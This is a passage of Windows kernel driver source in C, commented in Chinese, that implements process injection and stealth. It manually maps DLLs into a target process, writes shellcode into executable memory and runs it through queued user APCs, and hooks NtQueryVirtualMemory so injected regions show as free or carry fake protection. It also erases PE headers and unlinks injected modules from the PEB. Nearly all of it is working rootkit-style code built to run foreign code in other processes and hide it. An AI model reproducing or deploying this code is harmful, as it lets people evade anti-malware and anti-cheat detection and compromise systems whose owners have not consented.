    // 附加到目标进程
    status = HvAttachProcess(ProcessId, &process, &apcState);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    // 在目标进程分配内存 (#31: 改走 HvMemoryAllocate → HvPhysAllocateInProcess,
    // 不再调 ZwAllocateVirtualMemory。注意先 alloc 再 attach —— alloc 不需要
    // 上下文切换,attach 仅为后续的 memcpy 段映射保留)。
    HvDetachProcess(process, &apcState);
    status = HvMemoryAllocate(ProcessId, imageSize, PAGE_EXECUTE_READWRITE, &targetBase);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[Injection] HvMemoryAllocate failed: 0x%X\n", status);
        return status;
    }
    // 重新附加,后续段映射/重定位/导入解析仍用 attach + memcpy 模型
    // (完整 phys 化是 followup)。
    status = HvAttachProcess(ProcessId, &process, &apcState);
    if (!NT_SUCCESS(status)) {
        HvMemoryFree(ProcessId, targetBase);
        return status;
    }

    DbgPrint("[Injection] Allocated at: %p (via HvPhysAccess)\n", targetBase);
    
    // 映射节区
    status = InjectionMapSections(DllBuffer, targetBase, ntHeaders);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[Injection] Section mapping failed: 0x%X\n", status);
        goto Cleanup;
    }
    
    // 处理重定位
    delta = (LONGLONG)((ULONGLONG)targetBase - ntHeaders->OptionalHeader.ImageBase);
    status = InjectionProcessRelocations(targetBase, 
        (PIMAGE_NT_HEADERS64_INJ)((PUCHAR)targetBase + 
        ((PIMAGE_DOS_HEADER_INJ)targetBase)->e_lfanew), delta);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[Injection] Relocation failed: 0x%X\n", status);
        goto Cleanup;
    }
    
    // 解析导入
    status = InjectionResolveImports(process, targetBase,
        (PIMAGE_NT_HEADERS64_INJ)((PUCHAR)targetBase + 
        ((PIMAGE_DOS_HEADER_INJ)targetBase)->e_lfanew));
    if (!NT_SUCCESS(status)) {
        DbgPrint("[Injection] Import resolution failed: 0x%X\n", status);
        // 继续执行，可能部分成功
    }
    
    // 调用 TLS 回调
    status = InjectionCallTlsCallbacks(process, targetBase,
        (PIMAGE_NT_HEADERS64_INJ)((PUCHAR)targetBase + 
        ((PIMAGE_DOS_HEADER_INJ)targetBase)->e_lfanew), 1);  // DLL_PROCESS_ATTACH
    
    // 记录已注入模块
    moduleEntry = (PINJECTED_MODULE_ENTRY)HvAllocateNonPagedZeroed(
        sizeof(INJECTED_MODULE_ENTRY), HV_INJECTION_TAG);
    
    if (moduleEntry) {
        moduleEntry->ProcessId = ProcessId;
        moduleEntry->ModuleBase = targetBase;
        moduleEntry->ModuleSize = imageSize;
        
        KeAcquireSpinLock(&g_InjectionManager.Lock, &oldIrql);
        InsertTailList(&g_InjectionManager.InjectedModuleList, &moduleEntry->ListEntry);
        g_InjectionManager.InjectedModuleCount++;
        KeReleaseSpinLock(&g_InjectionManager.Lock, oldIrql);
    }
    
    // 填充结果
    if (OutResult) {
        OutResult->Status = STATUS_SUCCESS;
        OutResult->ModuleBase = targetBase;
        OutResult->ModuleSize = imageSize;
        OutResult->EntryPointAddress = (PUCHAR)targetBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    }
    
    DbgPrint("[Injection] ========== DLL Injection Complete ==========\n");
    DbgPrint("[Injection] Module base: %p, Entry point: %p\n",
        targetBase, (PUCHAR)targetBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    
    HvDetachProcess(process, &apcState);
    return STATUS_SUCCESS;
    
Cleanup:
    if (targetBase) {
        // #31: 不再用 ZwFreeVirtualMemory。Free 路径走 HvPhysFreeInProcess,
        // 不需要 attached 上下文。先 detach,再 free。
        HvDetachProcess(process, &apcState);
        HvMemoryFree(ProcessId, targetBase);
        return status;
    }
    HvDetachProcess(process, &apcState);
    return status;
}

NTSTATUS
HvUnloadInjectedDll(
    _In_ ULONG ProcessId,
    _In_ PVOID ModuleBase
)
{
    PINJECTED_MODULE_ENTRY moduleEntry;
    KIRQL oldIrql;
    NTSTATUS status;
    
    // 查找模块
    moduleEntry = InjectionFindModule(ProcessId, ModuleBase);
    if (!moduleEntry) {
        return STATUS_NOT_FOUND;
    }
    
    // 释放内存
    status = HvMemoryFree(ProcessId, ModuleBase);
    
    // 从列表移除
    KeAcquireSpinLock(&g_InjectionManager.Lock, &oldIrql);
    RemoveEntryList(&moduleEntry->ListEntry);
    g_InjectionManager.InjectedModuleCount--;
    KeReleaseSpinLock(&g_InjectionManager.Lock, oldIrql);
    
    ExFreePoolWithTag(moduleEntry, HV_INJECTION_TAG);
    
    return status;
}

// ============================================================
// Shellcode 注入
// ============================================================

NTSTATUS
HvInjectShellcode(
    _In_ ULONG ProcessId,
    _In_ PVOID Shellcode,
    _In_ SIZE_T Size,
    _In_opt_ PVOID Parameter,
    _Out_opt_ PVOID* OutAddress
)
{
    NTSTATUS status;
    PVOID targetAddress = NULL;
    
    DbgPrint("[Injection] Injecting shellcode, PID=%d, Size=0x%llX\n", 
        ProcessId, (ULONGLONG)Size);
    
    // 分配内存
    status = HvMemoryAllocate(ProcessId, Size, PAGE_EXECUTE_READWRITE, &targetAddress);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    // 写入 Shellcode
    status = HvMemoryWrite(ProcessId, targetAddress, Shellcode, Size, NULL);
    if (!NT_SUCCESS(status)) {
        HvMemoryFree(ProcessId, targetAddress);
        return status;
    }
    
    DbgPrint("[Injection] Shellcode written at %p\n", targetAddress);
    
    // 执行（通过 APC）
    status = HvQueueUserApc(ProcessId, 0, targetAddress, Parameter, FALSE);
    
    if (OutAddress) {
        *OutAddress = targetAddress;
    }
    
    return status;
}

NTSTATUS
HvInjectShellcodeNoExecute(
    _In_ ULONG ProcessId,
    _In_ PVOID Shellcode,
    _In_ SIZE_T Size,
    _Out_ PVOID* OutAddress
)
{
    NTSTATUS status;
    PVOID targetAddress = NULL;
    
    if (!OutAddress) {
        return STATUS_INVALID_PARAMETER;
    }
    
    // 分配内存
    status = HvMemoryAllocate(ProcessId, Size, PAGE_EXECUTE_READWRITE, &targetAddress);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    // 写入 Shellcode
    status = HvMemoryWrite(ProcessId, targetAddress, Shellcode, Size, NULL);
    if (!NT_SUCCESS(status)) {
        HvMemoryFree(ProcessId, targetAddress);
        return status;
    }
    
    *OutAddress = targetAddress;
    
    DbgPrint("[Injection] Shellcode injected (no execute) at %p\n", targetAddress);
    
    return STATUS_SUCCESS;
}

NTSTATUS
HvExecuteShellcode(
    _In_ ULONG ProcessId,
    _In_ PVOID Address,
    _In_opt_ PVOID Parameter,
    _In_ HV_EXECUTION_METHOD ExecMethod
)
{
    switch (ExecMethod) {
        case HvExecMethodApc:
            return HvQueueUserApc(ProcessId, 0, Address, Parameter, FALSE);
            
        case HvExecMethodThread:
            // 创建远程线程（未实现）
            DbgPrint("[Injection] Thread method not implemented\n");
            return STATUS_NOT_IMPLEMENTED;
            
        case HvExecMethodHijack:
            // 线程劫持（未实现）
            DbgPrint("[Injection] Hijack method not implemented\n");
            return STATUS_NOT_IMPLEMENTED;
            
        default:
            return STATUS_INVALID_PARAMETER;
    }
}

// ============================================================
// APC 执行引擎
// ============================================================

// APC 内核例程
static VOID
NTAPI
ApcKernelRoutine(
    _In_ PRKAPC Apc,
    _Inout_ PKNORMAL_ROUTINE_INJ* NormalRoutine,
    _Inout_ PVOID* NormalContext,
    _Inout_ PVOID* SystemArgument1,
    _Inout_ PVOID* SystemArgument2
)
{
    UNREFERENCED_PARAMETER(NormalRoutine);
    UNREFERENCED_PARAMETER(NormalContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);
    
    // 释放 APC 结构
    if (Apc) {
        ExFreePoolWithTag(Apc, HV_INJECTION_TAG);
    }
}

// APC 运行例程
static VOID
NTAPI
ApcRundownRoutine(
    _In_ PRKAPC Apc
)
{
    if (Apc) {
        ExFreePoolWithTag(Apc, HV_INJECTION_TAG);
    }
}

NTSTATUS
HvFindAlertableThread(
    _In_ PEPROCESS Process,
    _Out_ PETHREAD* OutThread
)
{
    NTSTATUS status = STATUS_NOT_FOUND;
    HANDLE processId;
    PVOID buffer = NULL;
    ULONG bufferSize = 0x10000;
    ULONG returnLength = 0;
    
    // 系统进程信息结构
    typedef struct _SYSTEM_THREAD_INFORMATION_INJ {
        LARGE_INTEGER KernelTime;
        LARGE_INTEGER UserTime;
        LARGE_INTEGER CreateTime;
        ULONG WaitTime;
        PVOID StartAddress;
        CLIENT_ID ClientId;
        LONG Priority;
        LONG BasePriority;
        ULONG ContextSwitches;
        ULONG ThreadState;
        ULONG WaitReason;
    } SYSTEM_THREAD_INFORMATION_INJ, *PSYSTEM_THREAD_INFORMATION_INJ;
    
    typedef struct _SYSTEM_PROCESS_INFO_INJ {
        ULONG NextEntryOffset;
        ULONG NumberOfThreads;
        LARGE_INTEGER WorkingSetPrivateSize;
        ULONG HardFaultCount;
        ULONG NumberOfThreadsHighWatermark;
        ULONGLONG CycleTime;
        LARGE_INTEGER CreateTime;
        LARGE_INTEGER UserTime;
        LARGE_INTEGER KernelTime;
        UNICODE_STRING ImageName;
        LONG BasePriority;
        HANDLE UniqueProcessId;
        HANDLE InheritedFromUniqueProcessId;
        ULONG HandleCount;
        ULONG SessionId;
        ULONG_PTR UniqueProcessKey;
        SIZE_T PeakVirtualSize;
        SIZE_T VirtualSize;
        ULONG PageFaultCount;
        SIZE_T PeakWorkingSetSize;
        SIZE_T WorkingSetSize;
        SIZE_T QuotaPeakPagedPoolUsage;
        SIZE_T QuotaPagedPoolUsage;
        SIZE_T QuotaPeakNonPagedPoolUsage;
        SIZE_T QuotaNonPagedPoolUsage;
        SIZE_T PagefileUsage;
        SIZE_T PeakPagefileUsage;
        SIZE_T PrivatePageCount;
        LARGE_INTEGER ReadOperationCount;
        LARGE_INTEGER WriteOperationCount;
        LARGE_INTEGER OtherOperationCount;
        LARGE_INTEGER ReadTransferCount;
        LARGE_INTEGER WriteTransferCount;
        LARGE_INTEGER OtherTransferCount;
        SYSTEM_THREAD_INFORMATION_INJ Threads[1];
    } SYSTEM_PROCESS_INFO_INJ, *PSYSTEM_PROCESS_INFO_INJ;
    
    if (!Process || !OutThread) {
        return STATUS_INVALID_PARAMETER;
    }
    
    *OutThread = NULL;
    processId = PsGetProcessId(Process);
    
    // 分配缓冲区
    while (TRUE) {
        buffer = HvAllocateNonPaged(bufferSize, HV_INJECTION_TAG);
        if (!buffer) {
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        
        status = ZwQuerySystemInformation(5, buffer, bufferSize, &returnLength);
        
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            HvFreePoolNonNull(buffer, HV_INJECTION_TAG);
            buffer = NULL;
            bufferSize = returnLength + 0x1000;
            continue;
        }
        
        if (!NT_SUCCESS(status)) {
            HvFreePoolNonNull(buffer, HV_INJECTION_TAG);
            return status;
        }
        break;
    }
    
    // 查找目标进程的线程
    __try {
        PSYSTEM_PROCESS_INFO_INJ processInfo = (PSYSTEM_PROCESS_INFO_INJ)buffer;
        
        while (TRUE) {
            if (processInfo->UniqueProcessId == processId) {
                // 找到目标进程
                ULONG i;
                for (i = 0; i < processInfo->NumberOfThreads; i++) {
                    HANDLE threadId = processInfo->Threads[i].ClientId.UniqueThread;
                    PETHREAD thread;
                    
                    if (NT_SUCCESS(PsLookupThreadByThreadId(threadId, &thread))) {
                        // 检查线程是否可警告
                        if (!PsIsThreadTerminating(thread)) {
                            *OutThread = thread;
                            status = STATUS_SUCCESS;
                            break;
                        }
                        ObDereferenceObject(thread);
                    }
                }
                break;
            }
            
            if (processInfo->NextEntryOffset == 0) break;
            processInfo = (PSYSTEM_PROCESS_INFO_INJ)((PUCHAR)processInfo + processInfo->NextEntryOffset);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }
    
    if (buffer) {
        ExFreePoolWithTag(buffer, HV_INJECTION_TAG);
    }
    
    return status;
}

NTSTATUS
HvQueueUserApc(
    _In_ ULONG ProcessId,
    _In_ ULONG ThreadId,
    _In_ PVOID ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _In_ BOOLEAN WaitComplete
)
{
    NTSTATUS status;
    PEPROCESS process;
    PETHREAD thread = NULL;
    PRKAPC apc;
    
    UNREFERENCED_PARAMETER(WaitComplete);
    
    DbgPrint("[Injection] Queuing user APC, PID=%d, TID=%d, Routine=%p\n",
        ProcessId, ThreadId, ApcRoutine);
    
    // 获取进程
    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    // 获取线程
    if (ThreadId != 0) {
        status = PsLookupThreadByThreadId((HANDLE)(ULONG_PTR)ThreadId, &thread);
    } else {
        // 查找可警告线程
        status = HvFindAlertableThread(process, &thread);
    }
    
    if (!NT_SUCCESS(status) || !thread) {
        ObDereferenceObject(process);
        DbgPrint("[Injection] Failed to find thread: 0x%X\n", status);
        return status;
    }
    
    // 分配 APC 结构
    apc = (PRKAPC)HvAllocateNonPaged(sizeof(KAPC), HV_INJECTION_TAG);
    if (!apc) {
        ObDereferenceObject(thread);
        ObDereferenceObject(process);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    // 初始化 APC
    KeInitializeApc(
        apc,
        (PRKTHREAD)thread,
        OriginalApcEnvironmentInj,
        (PVOID)ApcKernelRoutine,
        (PVOID)ApcRundownRoutine,
        (PVOID)ApcRoutine,
        UserMode,
        ApcContext
    );
    
    // 插入 APC
    if (!KeInsertQueueApc(apc, NULL, NULL, 0)) {
        ExFreePoolWithTag(apc, HV_INJECTION_TAG);
        ObDereferenceObject(thread);
        ObDereferenceObject(process);
        DbgPrint("[Injection] KeInsertQueueApc failed\n");
        return STATUS_UNSUCCESSFUL;
    }
    
    DbgPrint("[Injection] APC queued successfully\n");
    
    ObDereferenceObject(thread);
    ObDereferenceObject(process);
    
    return STATUS_SUCCESS;
}

// ============================================================
// 内核态无痕隐藏功能
// ============================================================

// 注意: g_HiddenMemory* 变量已在文件顶部定义

// NtQueryVirtualMemory Hook 相关
static PVOID g_NtQueryVirtualMemoryHook = NULL;
static PVOID g_OriginalNtQueryVirtualMemory = NULL;

// 原始函数类型
typedef NTSTATUS (NTAPI *PFN_NtQueryVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_ ULONG MemoryInformationClass,
    _Out_ PVOID MemoryInformation,
    _In_ SIZE_T MemoryInformationLength,
    _Out_opt_ PSIZE_T ReturnLength
);

// MEMORY_BASIC_INFORMATION 结构
typedef struct _MEMORY_BASIC_INFORMATION_INJ {
    PVOID BaseAddress;
    PVOID AllocationBase;
    ULONG AllocationProtect;
    USHORT PartitionId;
    SIZE_T RegionSize;
    ULONG State;
    ULONG Protect;
    ULONG Type;
} MEMORY_BASIC_INFORMATION_INJ, *PMEMORY_BASIC_INFORMATION_INJ;

// MemoryInformationClass 枚举
#define MemoryBasicInformation 0

/*
 * 初始化隐藏内存列表
 */
static VOID
InitHiddenMemoryList(VOID)
{
    if (!g_HiddenMemoryInitialized) {
        InitializeListHead(&g_HiddenMemoryList);
        KeInitializeSpinLock(&g_HiddenMemoryLock);
        g_HiddenMemoryInitialized = TRUE;
        g_HiddenMemoryCount = 0;
    }
}

/*
 * 查找隐藏内存条目
 */
static PHIDDEN_MEMORY_ENTRY
FindHiddenMemoryEntry(
    _In_ ULONG ProcessId,
    _In_ PVOID Address
)
{
    PLIST_ENTRY entry;
    PHIDDEN_MEMORY_ENTRY memEntry;
    KIRQL oldIrql;
    PHIDDEN_MEMORY_ENTRY result = NULL;
    
    if (!g_HiddenMemoryInitialized) {
        return NULL;
    }
    
    KeAcquireSpinLock(&g_HiddenMemoryLock, &oldIrql);
    
    for (entry = g_HiddenMemoryList.Flink;
         entry != &g_HiddenMemoryList;
         entry = entry->Flink)
    {
        memEntry = CONTAINING_RECORD(entry, HIDDEN_MEMORY_ENTRY, ListEntry);
        
        if (memEntry->ProcessId == ProcessId) {
            ULONG_PTR start = (ULONG_PTR)memEntry->BaseAddress;
            ULONG_PTR end = start + memEntry->RegionSize;
            ULONG_PTR addr = (ULONG_PTR)Address;
            
            if (addr >= start && addr < end) {
                result = memEntry;
                break;
            }
        }
    }
    
    KeReleaseSpinLock(&g_HiddenMemoryLock, oldIrql);
    
    return result;
}

/*
 * 检查地址是否应该被隐藏
 */
BOOLEAN
HvIsAddressHidden(
    _In_ ULONG ProcessId,
    _In_ PVOID Address
)
{
    return FindHiddenMemoryEntry(ProcessId, Address) != NULL;
}

/*
 * 添加内存区域到隐藏列表
 */
NTSTATUS
HvAddHiddenMemoryRegion(
    _In_ ULONG ProcessId,
    _In_ PVOID Address,
    _In_ SIZE_T Size,
    _In_ ULONG HideMode
)
{
    PHIDDEN_MEMORY_ENTRY memEntry;
    KIRQL oldIrql;
    
    InitHiddenMemoryList();
    
    // 检查是否已存在
    if (FindHiddenMemoryEntry(ProcessId, Address)) {
        DbgPrint("[Injection-Hide] Region already in hidden list\n");
        return STATUS_SUCCESS;
    }
    
    // 检查数量限制
    if (g_HiddenMemoryCount >= MAX_HIDDEN_MEMORY_REGIONS) {
        DbgPrint("[Injection-Hide] Hidden memory list full\n");
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    // 分配条目
    memEntry = (PHIDDEN_MEMORY_ENTRY)HvAllocateNonPagedZeroed(
        sizeof(HIDDEN_MEMORY_ENTRY), HV_INJECTION_TAG);
    
    if (!memEntry) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    memEntry->ProcessId = ProcessId;
    memEntry->BaseAddress = Address;
    memEntry->RegionSize = Size;
    memEntry->HideMode = HideMode;
    
    // 添加到列表
    KeAcquireSpinLock(&g_HiddenMemoryLock, &oldIrql);
    InsertTailList(&g_HiddenMemoryList, &memEntry->ListEntry);
    g_HiddenMemoryCount++;
    KeReleaseSpinLock(&g_HiddenMemoryLock, oldIrql);
    
    DbgPrint("[Injection-Hide] Added hidden region: PID=%d, Addr=%p, Size=0x%llX, Mode=0x%X\n",
        ProcessId, Address, (ULONGLONG)Size, HideMode);
    
    return STATUS_SUCCESS;
}

/*
 * 从隐藏列表移除内存区域
 */
NTSTATUS
HvRemoveHiddenMemoryRegion(
    _In_ ULONG ProcessId,
    _In_ PVOID Address
)
{
    PHIDDEN_MEMORY_ENTRY memEntry;
    KIRQL oldIrql;
    
    memEntry = FindHiddenMemoryEntry(ProcessId, Address);
    if (!memEntry) {
        return STATUS_NOT_FOUND;
    }
    
    KeAcquireSpinLock(&g_HiddenMemoryLock, &oldIrql);
    RemoveEntryList(&memEntry->ListEntry);
    g_HiddenMemoryCount--;
    KeReleaseSpinLock(&g_HiddenMemoryLock, oldIrql);
    
    ExFreePoolWithTag(memEntry, HV_INJECTION_TAG);
    
    DbgPrint("[Injection-Hide] Removed hidden region: PID=%d, Addr=%p\n",
        ProcessId, Address);
    
    return STATUS_SUCCESS;
}

/*
 * 擦除 PE 头
 */
NTSTATUS
HvErasePeHeader(
    _In_ ULONG ProcessId,
    _In_ PVOID ModuleBase,
    _In_ ULONG HeaderSize
)
{
    NTSTATUS status;
    PEPROCESS process;
    KAPC_STATE_INJ apcState;
    ULONG eraseSize = HeaderSize;
    PVOID zeroBuffer = NULL;
    
    DbgPrint("[Injection-Hide] Erasing PE header: PID=%d, Base=%p\n",
        ProcessId, ModuleBase);
    
    status = HvAttachProcess(ProcessId, &process, &apcState);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    __try {
        // 如果未指定大小，自动检测
        if (eraseSize == 0) {
            PIMAGE_DOS_HEADER_INJ dosHeader = (PIMAGE_DOS_HEADER_INJ)ModuleBase;
            
            if (dosHeader->e_magic == 0x5A4D) {
                PIMAGE_NT_HEADERS64_INJ ntHeaders = 
                    (PIMAGE_NT_HEADERS64_INJ)((PUCHAR)ModuleBase + dosHeader->e_lfanew);
                
                if (ntHeaders->Signature == 0x4550) {
                    eraseSize = ntHeaders->OptionalHeader.SizeOfHeaders;
                }
            }
            
            if (eraseSize == 0) {
                eraseSize = 0x1000;  // 默认擦除一个页面
            }
        }
        
        // 分配零缓冲区
        zeroBuffer = HvAllocateNonPagedZeroed(eraseSize, HV_INJECTION_TAG);
        if (!zeroBuffer) {
            HvDetachProcess(process, &apcState);
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        
        // 修改内存保护为可写
        PVOID baseAddr = ModuleBase;
        SIZE_T regionSize = eraseSize;
        ULONG oldProtect = 0;
        
        status = ZwProtectVirtualMemory(
            ZwCurrentProcess(),
            &baseAddr,
            &regionSize,
            PAGE_READWRITE,
            &oldProtect
        );
        
        if (NT_SUCCESS(status)) {
            // 用零覆盖 PE 头，但保留前几个字节的关键信息
            // 完全清零可能导致某些检查失败
            RtlCopyMemory((PUCHAR)ModuleBase + 2, (PUCHAR)zeroBuffer + 2, eraseSize - 2);
            
            // 恢复原始保护
            ZwProtectVirtualMemory(
                ZwCurrentProcess(),
                &baseAddr,
                &regionSize,
                oldProtect,
                &oldProtect
            );
            
            DbgPrint("[Injection-Hide] PE header erased, size=0x%X\n", eraseSize);
        } else {
            DbgPrint("[Injection-Hide] Failed to change protection: 0x%X\n", status);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
        DbgPrint("[Injection-Hide] Exception erasing PE header: 0x%X\n", status);
    }
    
    if (zeroBuffer) {
        ExFreePoolWithTag(zeroBuffer, HV_INJECTION_TAG);
    }
    
    HvDetachProcess(process, &apcState);
    
    // 更新隐藏条目
    PHIDDEN_MEMORY_ENTRY memEntry = FindHiddenMemoryEntry(ProcessId, ModuleBase);
    if (memEntry) {
        memEntry->PeHeaderErased = TRUE;
    }
    
    return status;
}

/*
 * 伪装 VAD 保护属性
 * 注意：直接修改 VAD 需要 undocumented 结构，这里通过修改返回给查询的结果来实现
 */
NTSTATUS
HvSpoofVadProtection(
    _In_ ULONG ProcessId,
    _In_ PVOID Address,
    _In_ ULONG FakeProtection
)
{
    PHIDDEN_MEMORY_ENTRY memEntry;
    
    memEntry = FindHiddenMemoryEntry(ProcessId, Address);
    if (!memEntry) {
        // 如果不在列表中，先添加
        NTSTATUS status = HvAddHiddenMemoryRegion(
            ProcessId, Address, PAGE_SIZE, HvHideModeSpoofProtection);
        if (!NT_SUCCESS(status)) {
            return status;
        }
        memEntry = FindHiddenMemoryEntry(ProcessId, Address);
    }
    
    if (memEntry) {
        memEntry->SpoofedProtection = FakeProtection;
        memEntry->HideMode |= HvHideModeSpoofProtection;
        DbgPrint("[Injection-Hide] Set spoofed protection: PID=%d, Addr=%p, Prot=0x%X\n",
            ProcessId, Address, FakeProtection);
    }
    
    return STATUS_SUCCESS;
}

/*
 * Hooked NtQueryVirtualMemory
 * 过滤隐藏的内存区域
 */
static NTSTATUS
NTAPI
HookedNtQueryVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_ ULONG MemoryInformationClass,
    _Out_ PVOID MemoryInformation,
    _In_ SIZE_T MemoryInformationLength,
    _Out_opt_ PSIZE_T ReturnLength
)
{
    NTSTATUS status;
    PFN_NtQueryVirtualMemory originalFunc;
    ULONG targetPid = 0;
    PEPROCESS targetProcess = NULL;
    
    originalFunc = (PFN_NtQueryVirtualMemory)g_OriginalNtQueryVirtualMemory;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }
    
    // 调用原始函数
    status = originalFunc(
        ProcessHandle,
        BaseAddress,
        MemoryInformationClass,
        MemoryInformation,
        MemoryInformationLength,
        ReturnLength
    );
    
    // 只处理成功的 MemoryBasicInformation 查询
    if (!NT_SUCCESS(status) || MemoryInformationClass != MemoryBasicInformation) {
        return status;
    }
    
    // 获取目标进程 ID
    __try {
        if (ProcessHandle == NtCurrentProcess() || ProcessHandle == (HANDLE)-1) {
            targetPid = (ULONG)(ULONG_PTR)PsGetCurrentProcessId();
        } else {
            status = ObReferenceObjectByHandle(
                ProcessHandle,
                0,
                *PsProcessType,
                ExGetPreviousMode(),
                (PVOID*)&targetProcess,
                NULL
            );
            
            if (NT_SUCCESS(status) && targetProcess) {
                targetPid = (ULONG)(ULONG_PTR)PsGetProcessId(targetProcess);
                ObDereferenceObject(targetProcess);
            }
        }
        
        // 检查是否需要隐藏
        if (targetPid != 0 && g_HiddenMemoryCount > 0) {
            PMEMORY_BASIC_INFORMATION_INJ memInfo = 
                (PMEMORY_BASIC_INFORMATION_INJ)MemoryInformation;
            
            PHIDDEN_MEMORY_ENTRY hiddenEntry = 
                FindHiddenMemoryEntry(targetPid, memInfo->BaseAddress);
            
            if (hiddenEntry) {
                // 根据隐藏模式处理
                if (hiddenEntry->HideMode & HvHideModeQueryFilter) {
                    // 完全隐藏：报告为 FREE 内存
                    memInfo->State = MEM_FREE;
                    memInfo->Protect = PAGE_NOACCESS;
                    memInfo->Type = 0;
                    memInfo->AllocationBase = NULL;
                    memInfo->AllocationProtect = 0;
                    
                    DbgPrint("[Injection-Hide] Filtered query for PID=%d, Addr=%p\n",
                        targetPid, BaseAddress);
                }
                else if (hiddenEntry->HideMode & HvHideModeSpoofProtection) {
                    // 伪装保护属性
                    if (hiddenEntry->SpoofedProtection != 0) {
                        memInfo->Protect = hiddenEntry->SpoofedProtection;
                        memInfo->AllocationProtect = hiddenEntry->SpoofedProtection;
                    }
                }
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        // 忽略异常，返回原始结果
    }
    
    return status;
}

/*
 * 安装内存隐藏 Hook
 */
NTSTATUS
HvInstallMemoryHideHook(VOID)
{
    NTSTATUS status;
    UNICODE_STRING funcName;
    PVOID ntQueryVirtualMemory;
    
    DbgPrint("[Injection-Hide] Installing NtQueryVirtualMemory hook...\n");
    
    InitHiddenMemoryList();
    
    if (g_NtQueryVirtualMemoryHook != NULL) {
        DbgPrint("[Injection-Hide] Hook already installed\n");
        return STATUS_SUCCESS;
    }
    
    // 获取函数地址
    RtlInitUnicodeString(&funcName, L"NtQueryVirtualMemory");
    ntQueryVirtualMemory = MmGetSystemRoutineAddress(&funcName);
    
    if (!ntQueryVirtualMemory) {
        DbgPrint("[Injection-Hide] Failed to find NtQueryVirtualMemory\n");
        return STATUS_NOT_FOUND;
    }
    
    DbgPrint("[Injection-Hide] NtQueryVirtualMemory at %p\n", ntQueryVirtualMemory);
    
    // 通过 HvHook 安装 Hook
    status = HvHookInstall(
        ntQueryVirtualMemory,
        HookedNtQueryVirtualMemory,
        (HV_HOOK_HANDLE*)&g_NtQueryVirtualMemoryHook
    );
    
    if (NT_SUCCESS(status)) {
        g_OriginalNtQueryVirtualMemory = HvHookGetTrampoline(g_NtQueryVirtualMemoryHook);
        DbgPrint("[Injection-Hide] Hook installed, trampoline at %p\n",
            g_OriginalNtQueryVirtualMemory);
    } else {
        DbgPrint("[Injection-Hide] Hook installation failed: 0x%X\n", status);
    }
    
    return status;
}

/*
 * 移除内存隐藏 Hook
 */
NTSTATUS
HvRemoveMemoryHideHook(VOID)
{
    NTSTATUS status = STATUS_SUCCESS;
    
    if (g_NtQueryVirtualMemoryHook) {
        DbgPrint("[Injection-Hide] Removing NtQueryVirtualMemory hook...\n");
        status = HvHookRemove(g_NtQueryVirtualMemoryHook);
        g_NtQueryVirtualMemoryHook = NULL;
        g_OriginalNtQueryVirtualMemory = NULL;
    }
    
    return status;
}

/*
 * 完整的内存隐藏（内核态无痕）
 */
NTSTATUS
HvHideInjectedMemory(
    _In_ ULONG ProcessId,
    _In_ PVOID Address,
    _In_ SIZE_T Size
)
{
    NTSTATUS status;
    PINJECTED_MODULE_ENTRY moduleEntry;
    
    DbgPrint("[Injection-Hide] ========== Hiding Memory (Kernel-Level) ==========\n");
    DbgPrint("[Injection-Hide] PID=%d, Address=%p, Size=0x%llX\n",
        ProcessId, Address, (ULONGLONG)Size);
    
    // 1. 确保 Hook 已安装
    status = HvInstallMemoryHideHook();
    if (!NT_SUCCESS(status)) {
        DbgPrint("[Injection-Hide] Warning: Hook installation failed\n");
        // 继续执行其他隐藏措施
    }
    
    // 2. 添加到隐藏列表（启用完整隐藏模式）
    status = HvAddHiddenMemoryRegion(ProcessId, Address, Size, HvHideModeComplete);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[Injection-Hide] Failed to add to hidden list: 0x%X\n", status);
        return status;
    }
    
    // 3. 擦除 PE 头
    status = HvErasePeHeader(ProcessId, Address, 0);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[Injection-Hide] Warning: PE header erase failed\n");
    }
    
    // 4. 伪装保护属性（PAGE_READWRITE 比 PAGE_EXECUTE_READWRITE 不那么可疑）
    status = HvSpoofVadProtection(ProcessId, Address, PAGE_READWRITE);
    
    // 5. 从 PEB 模块列表解链（如果是 DLL）
    status = HvHideInjectedModule(ProcessId, Address);
    
    // 6. 更新模块条目
    moduleEntry = InjectionFindModule(ProcessId, Address);
    if (moduleEntry) {
        moduleEntry->IsHidden = TRUE;
    }
    
    DbgPrint("[Injection-Hide] ========== Memory Hidden Successfully ==========\n");
    
    return STATUS_SUCCESS;
}

/*
 * 取消隐藏内存
 */
NTSTATUS
HvUnhideInjectedMemory(
    _In_ ULONG ProcessId,
    _In_ PVOID Address
)
{
    NTSTATUS status;
    PINJECTED_MODULE_ENTRY moduleEntry;
    
    DbgPrint("[Injection-Hide] Unhiding memory: PID=%d, Address=%p\n",
        ProcessId, Address);
    
    // 从隐藏列表移除
    status = HvRemoveHiddenMemoryRegion(ProcessId, Address);
    
    // 更新模块条目
    moduleEntry = InjectionFindModule(ProcessId, Address);
    if (moduleEntry) {
        moduleEntry->IsHidden = FALSE;
    }
    
    return status;
}

/*
